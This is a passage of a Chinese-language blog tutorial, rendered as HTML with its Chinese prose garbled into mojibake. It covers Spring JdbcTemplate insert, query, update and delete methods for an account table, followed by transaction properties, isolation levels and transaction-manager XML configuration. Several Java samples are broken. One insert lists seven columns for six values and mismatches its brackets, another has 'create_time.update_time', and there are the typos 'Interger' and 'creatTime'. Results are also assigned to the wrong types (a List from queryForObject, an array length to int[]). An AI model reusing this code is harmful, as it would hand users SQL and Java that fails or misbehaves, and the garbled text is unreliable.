class="line"></span><br><span class="line">    <span class="keyword">public</span> Integer <span class="title function_">getUserId</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> UserId;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setUserId</span><span class="params">(Integer userId)</span> &#123;</span><br><span class="line">        UserId = userId;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Integer <span class="title function_">getAccountId</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> accountId;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAccountId</span><span class="params">(Integer accountId)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.accountId = accountId;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="æ•°æ®æ·»åŠ "><a href="#æ•°æ®æ·»åŠ " class="headerlink" title="æ•°æ®æ·»åŠ "></a>æ•°æ®æ·»åŠ </h3><p><strong>æ·»åŠ å•æ¡æ•°æ®ï¼Œè¿”å›å—å½±å“çš„è¡Œæ•°</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">addAccount</span><span class="params">(Account account)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;insert into tb_account(account_name,account_type,balance,remark,&quot;</span> + </span><br><span class="line">                 <span class="string">&quot;user_id,create_time,update_time) values (?,?,?,?,now(),now());&quot;</span></span><br><span class="line">    Object[] objs = &#123;account.getAccountName(),account.getAccountType(),</span><br><span class="line">                     account.getBalance(),account.getRemark(),account.getUserId());</span><br><span class="line">    <span class="keyword">return</span> jdbcTemplate.update(sql,objs);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>æ·»åŠ å•æ¡æ•°æ®ï¼Œè¿”å›ä¸»é”®</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">addAccountHaskey</span><span class="params">(Account account)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;insert into tb_account(account_name,account_type,balance,remark,user_id,create_time.update_time) values (?,?,?,?,?,now(),now())&quot;</span>;</span><br><span class="line">    <span class="type">KeyHolder</span> <span class="variable">keyHolder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GeneratedKeyHolder</span>();</span><br><span class="line">    jdbcTemplate.update(connection -&gt; &#123;</span><br><span class="line">        <span class="type">PreparedStatement</span> <span class="variable">ps</span> <span class="operator">=</span> connection.prepareStatement(sql,Statement.RETURN_GENERATED_KEYS);</span><br><span class="line">        ps.setString(<span class="number">1</span>,account.getAccountName());</span><br><span class="line">        ps.setString(<span class="number">2</span>,account.getAccountType());</span><br><span class="line">        ps.setDouble(<span class="number">3</span>,account.getBalance());</span><br><span class="line">        ps.setString(<span class="number">4</span>,account.getRemark());</span><br><span class="line">        ps.setInt(<span class="number">5</span>,account.getUserId());</span><br><span class="line">        <span class="keyword">return</span> ps;</span><br><span class="line">    &#125;,keyHolder);</span><br><span class="line">    <span class="type">Integer</span> <span class="variable">key</span> <span class="operator">=</span> keyHolder.getKey().intValue();</span><br><span class="line">    <span class="keyword">return</span> key;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>update()</code>æ–¹æ³•çš„ä¸€ä¸ªå‚æ•°<code>PreparedStatementCreator</code>æ˜¯ä¸€ä¸ªæ¥å£ï¼Œæ•…æ­¤å¤„ç›´æ¥ä¼ å…¥äº†ä¸€ä¸ªlambdaè¡¨è¾¾å¼ï¼Œè€Œä¸æ˜¯è¯¥lambdaè¡¨è¾¾å¼çš„è¿”å›å€¼ï¼Œlambdaè¡¨è¾¾å¼æœ¬èº«å°±æ˜¯ä¸€ä¸ªè‡ªåŠ¨å®ç°<code>PreparedStatementCreator</code>æ¥å£çš„å¯¹è±¡ï¼Œ<code>update()</code>æ–¹æ³•å†…éƒ¨è°ƒç”¨æ¥å£ä¸­çš„<code>createPreparedStatement()</code>è·å¾—é…ç½®å¥½çš„ <code>PreparedStatement</code>æ‰§è¡Œ SQL</p><p><strong>æ‰¹é‡æ·»åŠ æ•°æ®ï¼Œè¿”å›å—å½±å“çš„è¡Œæ•°</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">addAccountBatch</span><span class="params">(<span class="keyword">final</span> List&lt;Account&gt; accounts)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;insert into tb_account(account_name,account_type,balance,remark,&quot;</span> + </span><br><span class="line">                 <span class="string">&quot;user_id,create_time,update_time) values (?,?,?,?,?,now(),now())&quot;</span>;</span><br><span class="line">    <span class="type">int</span>[] rows = jdbcTemplate.batchUpdate(sql, <span class="keyword">new</span> <span class="title class_">BatchPreparedStatementSetter</span>() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setValues</span><span class="params">(PreparedStatement preparedStatement, <span class="type">int</span> i)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">            preparedStatement.setString(<span class="number">1</span>, accounts.get(i).getAccountName());</span><br><span class="line">            preparedStatement.setString(<span class="number">2</span>, accounts.get(i).getAccountType());</span><br><span class="line">            preparedStatement.setDouble(<span class="number">3</span>, accounts.get(i).getBalance());</span><br><span class="line">            preparedStatement.setString(<span class="number">4</span>, accounts.get(i).getRemark());</span><br><span class="line">            preparedStatement.setInt(<span class="number">5</span>, accounts.get(i).getUserId());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getBatchSize</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> accounts.size();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;).length;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> rows;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="æ•°æ®æŸ¥è¯¢"><a href="#æ•°æ®æŸ¥è¯¢" class="headerlink" title="æ•°æ®æŸ¥è¯¢"></a>æ•°æ®æŸ¥è¯¢</h3><p><strong>æŸ¥è¯¢æŒ‡å®šç”¨æˆ·çš„ä¿¡æ¯æ•°</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">queryAccountCount</span><span class="params">(Integer userId)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;select count(1) from tb_account where user_id = ?&quot;</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> jdbcTemplate.queryForObject(sql, Integer.class, userId);</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>æŸ¥è¯¢æŒ‡å®šç”¨æˆ·çš„è´¦æˆ·è¯¦æƒ…</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Account <span class="title function_">queryAccountById</span><span class="params">(Integer accountId)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;select * from tb_account where account_id = ?&quot;</span>;</span><br><span class="line">    <span class="type">Account</span> <span class="variable">account</span> <span class="operator">=</span> jdbcTemplate.queryForObject(sql, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;accountId&#125;,</span><br><span class="line">        (ResultSet resultSet,<span class="type">int</span> i) -&gt; &#123;</span><br><span class="line">            <span class="type">Account</span> <span class="variable">acc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Account</span>();</span><br><span class="line">            acc.setAccountId(resultSet.getInt(<span class="string">&quot;account_id&quot;</span>));</span><br><span class="line">            acc.setBalance(resultSet.getDouble(<span class="string">&quot;Balance&quot;</span>));</span><br><span class="line">            acc.setAccountName(resultSet.getString(<span class="string">&quot;account_name&quot;</span>));</span><br><span class="line">            acc.setAccountType(resultSet.getString(<span class="string">&quot;account_type&quot;</span>));</span><br><span class="line">            acc.setRemark(resultSet.getString(<span class="string">&quot;remark&quot;</span>));</span><br><span class="line">            acc.setCreateTime(resultSet.getDate(<span class="string">&quot;create_time&quot;</span>));</span><br><span class="line">            acc.setUpdateTime(resultSet.getDate(<span class="string">&quot;update_time&quot;</span>));</span><br><span class="line">            acc.setUserId(resultSet.getInt(<span class="string">&quot;user_id&quot;</span>));</span><br><span class="line">            <span class="keyword">return</span> acc;</span><br><span class="line">        &#125;);</span><br><span class="line">    <span class="keyword">return</span> account;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>å¤šæ¡ä»¶æŸ¥è¯¢ç”¨æˆ·è´¦æˆ·ä¿¡æ¯æ­é…æ¨¡ç³Šæœç´¢</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> List&lt;Account&gt; <span class="title function_">queryAccountByParams</span><span class="params">(Interger userId, String accountName, String accountType, String createTime)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;select * from tb_account where user_id = ?&quot;</span>;</span><br><span class="line">    List&lt;Object&gt; params = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    params.add(userId);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(StringUtils.isNotBlank(accountName)) &#123;</span><br><span class="line">        sql += <span class="string">&quot; and account_name like concat(&#x27;%&#x27;,?,&#x27;%&#x27;)&quot;</span>;</span><br><span class="line">        params.add(accountName);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(StringUtils.isNotBlank(accountType)) &#123;</span><br><span class="line">        sql += <span class="string">&quot; and account_type = ?&quot;</span>;</span><br><span class="line">        params.add(accountType);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(StringUtils.isNotBlank(creatTime))&#123;</span><br><span class="line">        sql += <span class="string">&quot; and creat_time &lt; ?&quot;</span>;</span><br><span class="line">        params.add(creatTime);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    Object[] objs = params.toArray();</span><br><span class="line">    List&lt;Account&gt; accounts = jdbcTemplate.queryForObject(sql, objs,</span><br><span class="line">        (ResultSet resultSet,<span class="type">int</span> i) -&gt; &#123;</span><br><span class="line">            <span class="type">Account</span> <span class="variable">acc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Account</span>();</span><br><span class="line">            acc.setAccountId(resultSet.getInt(<span class="string">&quot;account_id&quot;</span>));</span><br><span class="line">            acc.setBalance(resultSet.getDouble(<span class="string">&quot;Balance&quot;</span>));</span><br><span class="line">            acc.setAccountName(resultSet.getString(<span class="string">&quot;account_name&quot;</span>));</span><br><span class="line">            acc.setAccountType(resultSet.getString(<span class="string">&quot;account_type&quot;</span>));</span><br><span class="line">            acc.setRemark(resultSet.getString(<span class="string">&quot;remark&quot;</span>));</span><br><span class="line">            acc.setCreateTime(resultSet.getTimestamp(<span class="string">&quot;create_time&quot;</span>));</span><br><span class="line">            acc.setUpdateTime(resultSet.getTimestamp(<span class="string">&quot;update_time&quot;</span>));</span><br><span class="line">            acc.setUserId(resultSet.getInt(<span class="string">&quot;user_id&quot;</span>));</span><br><span class="line">            <span class="keyword">return</span> acc;</span><br><span class="line">        &#125;);</span><br><span class="line">    <span class="keyword">return</span> accounts;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>params</code>ä¸€å¼€å§‹ç”¨æ•°ç»„åé¢åˆè½¬å›æ•°ç»„çš„åŸå› æ˜¯ä¼ å…¥çš„å‚æ•°æœªå®šï¼Œåœ¨ç»è¿‡åé¢çš„ifåˆ¤æ–­åæ‰èƒ½ç¡®å®šä¼ å…¥çš„å‚æ•°ä¸ªæ•°</p><h3 id="æ•°æ®æ›´æ–°"><a href="#æ•°æ®æ›´æ–°" class="headerlink" title="æ•°æ®æ›´æ–°"></a>æ•°æ®æ›´æ–°</h3><p><strong>æ›´æ–°è´¦æˆ·ä¿¡æ¯ï¼Œè¿”å›æ›´æ–°çš„è¡Œæ•°</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">updateAccountById</span><span class="params">(Account account)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;update tb_account set account_name = ?, account_type = ?, &quot;</span> + </span><br><span class="line">                 <span class="string">&quot; balance = ? ,remark = ?,user_id = ? ,update_time = now() &quot;</span> + </span><br><span class="line">                 <span class="string">&quot; where account_id = ? &quot;</span>;</span><br><span class="line">    Object[] objs = &#123;account.getAccountName(), account.getAccountType(),</span><br><span class="line">                    account.getBalance(), account.getRemark(), account.getUserId(),</span><br><span class="line">                    account.getAccountId()&#125;;</span><br><span class="line">    <span class="keyword">return</span> jdbcTemplate.update(sql, objs);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>æ‰¹é‡æ›´æ–°è´¦æˆ·ä¿¡æ¯ï¼Œè¿”å›å—å½±å“çš„è¡Œæ•°</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">updateAccountBatch</span><span class="params">(List&lt;Account&gt; accounts)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;update tb_account set account_name = ?, account_type = ?, &quot;</span> +</span><br><span class="line">                 <span class="string">&quot; balance = ? ,remark = ?,user_id = ? ,update_time = now() &quot;</span> +</span><br><span class="line">                 <span class="string">&quot; where account_id = ? &quot;</span>;</span><br><span class="line">    <span class="type">int</span>[] rows = jdbcTemplate.batchUpdate(sql, <span class="keyword">new</span> <span class="title class_">BatchPreparedStatementSetter</span>() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setValues</span><span class="params">(PreparedStatement ps, <span class="type">int</span> i)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">            ps.setString(<span class="number">1</span>, accounts.get(i).getAccountName());</span><br><span class="line">            ps.setString(<span class="number">2</span>, accounts.get(i).getAccountType());</span><br><span class="line">            ps.setDouble(<span class="number">3</span>, accounts.get(i).getBalance());</span><br><span class="line">            ps.setString(<span class="number">4</span>, accounts.get(i).getRemark());</span><br><span class="line">            ps.setInt(<span class="number">5</span>, accounts.get(i).getUserId());</span><br><span class="line">            ps.setInt(<span class="number">6</span>, accounts.get(i).getAccountId());</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getBatchSize</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> accounts.size();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;).length;</span><br><span class="line">    <span class="keyword">return</span> rows;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="æ•°æ®åˆ é™¤"><a href="#æ•°æ®åˆ é™¤" class="headerlink" title="æ•°æ®åˆ é™¤"></a>æ•°æ®åˆ é™¤</h3><p><strong>åˆ é™¤è´¦æˆ·ä¿¡æ¯ï¼Œè¿”å›æ›´æ–°çš„è¡Œæ•°</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Integer <span class="title function_">deleteAccountById</span><span class="params">(Integer accountId)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;delete from tb_account where account_id = ?&quot;</span>;</span><br><span class="line">    Object[] objs = &#123;accountId&#125;;</span><br><span class="line">    <span class="keyword">return</span> jdbcTemplate.update(sql, objs);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>æ‰¹é‡åˆ é™¤è´¦æˆ·ä¿¡æ¯ï¼Œè¿”å›æ›´æ–°çš„è¡Œæ•°</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">deleteAccountBatch</span><span class="params">(Integer[] ids)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;delete from tb_account where account_id = ?&quot;</span>;</span><br><span class="line">    <span class="type">int</span>[] rows = jdbcTemplate.batchUpdate(sql, <span class="keyword">new</span> <span class="title class_">BatchPreparedStatementSetter</span>() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setValues</span><span class="params">(PreparedStatement ps, <span class="type">int</span> i)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">            ps.setInt(<span class="number">1</span>, ids[i]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getBatchSize</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> ids.length;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;).length;</span><br><span class="line">    <span class="keyword">return</span> rows;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><be/><h1 id="SpringFrameworkæ¡†æ¶-äº‹åŠ¡æ§åˆ¶"><a href="#SpringFrameworkæ¡†æ¶-äº‹åŠ¡æ§åˆ¶" class="headerlink" title="SpringFrameworkæ¡†æ¶-äº‹åŠ¡æ§åˆ¶"></a>SpringFrameworkæ¡†æ¶-äº‹åŠ¡æ§åˆ¶</h1><p>Springäº‹åŠ¡ç®¡ç†è®©å¤šä¸ªæ•°æ®åº“æ“ä½œè¦ä¹ˆå…¨éƒ¨æˆåŠŸè¦ä¹ˆå…¨éƒ¨å¤±è´¥ï¼Œé€šè¿‡@Transactionalæ³¨è§£è‡ªåŠ¨å¤„ç†äº‹åŠ¡å¼€å§‹ã€æäº¤å’Œå›æ»šï¼Œç¡®ä¿æ•°æ®ä¸€è‡´æ€§ï¼Œé¿å…æ‰‹åŠ¨ç®¡ç†äº‹åŠ¡çš„ç¹çä»£ç </p><h3 id="äº‹åŠ¡çš„ç‰¹æ€§"><a href="#äº‹åŠ¡çš„ç‰¹æ€§" class="headerlink" title="äº‹åŠ¡çš„ç‰¹æ€§"></a>äº‹åŠ¡çš„ç‰¹æ€§</h3><p><strong>åŸå­æ€§ï¼ˆAtomicityï¼‰</strong></p><p>è¦ä¹ˆå…¨éƒ¨æˆåŠŸï¼Œè¦ä¹ˆå…¨éƒ¨å¤±è´¥</p><p><strong>ä¸€è‡´æ€§ï¼ˆConsistencyï¼‰</strong></p><p>äº‹åŠ¡åœ¨æ‰§è¡Œå‰åï¼Œæ•°æ®åº“ä¸­æ•°æ®è¦ä¿æŒä¸€è‡´æ€§çŠ¶æ€ã€‚ï¼ˆå¦‚è½¬è´¦çš„è¿‡ç¨‹ è´¦æˆ·æ“ä½œåæ•°æ®å¿…é¡»ä¿æŒä¸€è‡´ï¼‰</p><p><strong>éš”ç¦»æ€§ï¼ˆIsolationï¼‰</strong></p><p>äº‹åŠ¡ä¸äº‹åŠ¡ä¹‹é—´çš„æ‰§è¡Œåº”å½“æ˜¯ç›¸äº’éš”ç¦»äº’ä¸å½±å“çš„ã€‚ï¼ˆå¤šä¸ªè§’è‰²å¯¹åŒä¸€è®°å½•è¿›è¡Œæ“ä½œå¿…é¡»ä¿è¯æ²¡æœ‰ä»»ä½•å¹²æ‰°ï¼‰ï¼Œå½“ç„¶æ²¡æœ‰å½±å“æ˜¯ä¸å¯èƒ½çš„ï¼Œä¸ºäº†è®©å½±å“çº§åˆ«é™åˆ°æœ€ä½ï¼Œé€šè¿‡éš”ç¦»çº§åˆ«åŠ ä»¥é™åˆ¶ï¼š</p><table><thead><tr><th align="left">éš”ç¦»çº§åˆ«</th><th align="left">è‹±æ–‡åç§°</th><th align="left">è„è¯»</th><th align="left">ä¸å¯é‡å¤è¯»</th><th align="left">å¹»è¯»</th><th align="left">æè¿°</th></tr></thead><tbody><tr><td align="left">è¯»æœªæäº¤</td><td align="left"><code>READ_UNCOMMITTED</code></td><td align="left">âœ“</td><td align="left">âœ“</td><td align="left">âœ“</td><td align="left">éš”ç¦»çº§åˆ«æœ€ä½ï¼Œä¼šå¼•å‘è„è¯»ã€ä¸å¯é‡å¤è¯»å’Œå¹»è¯»é—®é¢˜</td></tr><tr><td align="left">è¯»å·²æäº¤</td><td align="left"><code>READ_COMMITTED</code></td><td align="left">âœ—</td><td align="left">âœ“</td><td align="left">âœ“</td><td align="left">åªèƒ½è¯»å–å·²æäº¤çš„æ•°æ®ï¼Œé¿å…äº†è„è¯»ï¼Œä½†ä»æœ‰ä¸å¯é‡å¤è¯»å’Œå¹»è¯»é—®é¢˜</td></tr><tr><td align="left">å¯é‡å¤è¯»</td><td align="left"><code>REPEATABLE_READ</code></td><td align="left">âœ—</td><td align="left">âœ—</td><td align="left">âœ“</td><td align="left">ç¡®ä¿åŒä¸€äº‹åŠ¡ä¸­å¤šæ¬¡è¯»å–åŒä¸€æ•°æ®ç»“æœä¸€è‡´ï¼Œé¿å…äº†è„è¯»å’Œä¸å¯é‡å¤è¯»ï¼Œä½†ä»å­˜åœ¨å¹»è¯»é—®é¢˜</td></tr><tr><td align="left">ä¸²è¡ŒåŒ–</td><td align="left"><code>SERIALIZABLE</code></td><td align="left">âœ—</td><td align="left">âœ—</td><td align="left">âœ—</td><td align="left">æœ€ä¸¥æ ¼çš„éš”ç¦»çº§åˆ«ï¼Œäº‹åŠ¡ä¸²è¡Œæ‰§è¡Œï¼Œå®Œå…¨é¿å…è„è¯»ã€ä¸å¯é‡å¤è¯»å’Œå¹»è¯»é—®é¢˜ï¼Œä½†æ€§èƒ½æœ€ä½</td></tr></tbody></table><p><strong>æŒä¹…æ€§ï¼ˆDurabilityï¼‰</strong></p><p>äº‹åŠ¡æäº¤å®Œæ¯•åï¼Œæ•°æ®åº“ä¸­çš„æ•°æ®å˜æ›´æ˜¯æ°¸ä¹…çš„</p><h3 id="äº‹åŠ¡æ¥å£"><a href="#äº‹åŠ¡æ¥å£" class="headerlink" title="äº‹åŠ¡æ¥å£"></a>äº‹åŠ¡æ¥å£</h3><p>Springäº‹åŠ¡ç®¡ç†å™¨çš„æ¥å£æ˜¯<code>org.springframework.transaction.PlatformTransactionManager</code>ï¼Œè¯¥æ¥å£æä¾›å…¥ä¸‹æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">PlatformTransactionManager</span> <span class="keyword">extends</span> <span class="title class_">TransactionManager</span> &#123;</span><br><span class="line">    TransactionStatus <span class="title function_">getTransaction</span><span class="params">(<span class="meta">@Nullable</span> TransactionDefinition definition)</span> <span class="keyword">throws</span> TransactionException;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">commit</span><span class="params">(TransactionStatus status)</span> <span class="keyword">throws</span> TransactionException;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">rollback</span><span class="params">(TransactionStatus status)</span> <span class="keyword">throws</span> TransactionException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>JDBCäº‹åŠ¡ç®¡ç†</strong></p><p>å½“åº”ç”¨ç¨‹åºç›´æ¥ä½¿ç”¨ JDBC è¿›è¡Œæ•°æ®æŒä¹…åŒ–æ—¶ï¼ŒSpring é€šè¿‡ <code>DataSourceTransactionManager</code> æ¥ç®¡ç†äº‹åŠ¡è¾¹ç•Œã€‚é…ç½®æ–¹å¼å¦‚ä¸‹</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;transactionManager&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.springframework.jdbc.datasource.DataSourceTransactionManager&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;dataSource&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;dataSource&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>DataSourceTransactionManager</code> é€šè¿‡ä» <code>DataSource</code> è·å– <code>java.sql.Connection</code> å¯¹è±¡æ¥ç®¡ç†äº‹åŠ¡ï¼Œäº‹åŠ¡æäº¤æ—¶è°ƒç”¨ <code>Connection.commit()</code> æ–¹æ³•ï¼Œäº‹åŠ¡å›æ»šæ—¶è°ƒç”¨ <code>Connection.rollback()</code> æ–¹æ³•</p><p><strong>Hibernate äº‹åŠ¡ç®¡ç†</strong></p><p>å½“åº”ç”¨ç¨‹åºä½¿ç”¨ Hibernate ä½œä¸ºæŒä¹…åŒ–æ¡†æ¶æ—¶ï¼ŒSpring é€šè¿‡ <code>HibernateTransactionManager</code> æ¥ç®¡ç†äº‹åŠ¡ã€‚å¯¹äº Hibernate 3ï¼Œé…ç½®å¦‚ä¸‹</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;transactionManager&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.springframework.orm.hibernate3.HibernateTransactionManager&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;sessionFactory&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;sessionFactory&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>HibernateTransactionManager</code> éœ€è¦æ³¨å…¥ Hibernate çš„ <code>SessionFactory</code>ï¼Œè¯¥ç®¡ç†å™¨å°†äº‹åŠ¡ç®¡ç†èŒè´£å§”æ‰˜ç»™ Hibernate çš„ <code>org.hibernate.Transaction</code> å¯¹è±¡ï¼Œ<code>Transaction</code> å¯¹è±¡ä» Hibernate <code>Session</code> ä¸­è·å–ï¼Œäº‹åŠ¡æˆåŠŸå®Œæˆæ—¶è°ƒç”¨ <code>Transaction.commit()</code> æ–¹æ³•ï¼Œäº‹åŠ¡å¤±è´¥æ—¶è°ƒç”¨ <code>Transaction.rollback()</code> æ–¹æ³•</p><p><strong>JPAï¼ˆJavaæŒä¹…åŒ–APIï¼‰äº‹åŠ¡ç®¡ç†</strong></p><p>å½“åº”ç”¨ç¨‹åºä½¿ç”¨ JPA ä½œä¸ºæŒä¹…åŒ–æ ‡å‡†æ—¶ï¼ŒSpring é€šè¿‡ <code>JpaTransactionManager</code> æ¥ç®¡ç†äº‹åŠ¡ã€‚é…ç½®æ–¹å¼å¦‚ä¸‹</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;transactionManager&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.springframework.orm.jpa.JpaTransactionManager&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;entityManagerFactory&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;entityManagerFactory&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>JpaTransactionManager</code> éœ€è¦è£…é…ä¸€ä¸ª JPA å®ä½“ç®¡ç†å·¥å‚ï¼ˆ<code>javax.persistence.EntityManagerFactory</code> çš„å®ç°ï¼‰ï¼Œè¯¥ç®¡ç†å™¨ä¸ JPA <code>EntityManager</code> åä½œæ¥æ„å»ºå’Œç®¡ç†äº‹åŠ¡ï¼Œé€šè¿‡ <code>EntityManagerFactory</code> è·å– <code>EntityManager</code>ï¼Œå¹¶åœ¨å…¶åŸºç¡€ä¸Šè¿›è¡Œäº‹åŠ¡æ§åˆ¶</p><p><strong>JTAï¼ˆJavaäº‹åŠ¡APIï¼‰äº‹åŠ¡ç®¡ç†</strong></p><p>å½“åº”ç”¨ç¨‹åºæ¶‰åŠåˆ†å¸ƒå¼äº‹åŠ¡æˆ–å¤šä¸ªäº‹åŠ¡èµ„æºï¼ˆå¦‚å¤šä¸ªä¸åŒæ•°æ®æºï¼‰æ—¶ï¼ŒSpring é€šè¿‡ <code>JtaTransactionManager</code> æ¥ç®¡ç†äº‹åŠ¡ã€‚é…ç½®æ–¹å¼å¦‚ä¸‹</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;transactionManager&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.springframework.transaction.jta.JtaTransactionManager&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;transactionManagerName&quot;</span> <span class="attr">value</span>=<span class="string">&quot;java:/TransactionManager&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span 